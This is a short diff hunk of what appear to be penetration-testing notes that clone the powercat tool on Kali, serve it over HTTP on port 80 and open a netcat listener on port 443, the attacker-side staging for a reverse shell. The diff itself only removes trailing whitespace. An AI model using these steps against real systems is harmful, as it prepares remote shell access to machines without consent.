@@ -1,6 +1,6 @@
 ON KALI:
 git clone https://github.com/besimorhino/powercat.git
-cd powercat/ 
+cd powercat/
 python -m SimpleHTTPServer 80
 open in another terminal a netcat listener: nc -l -p 443
 
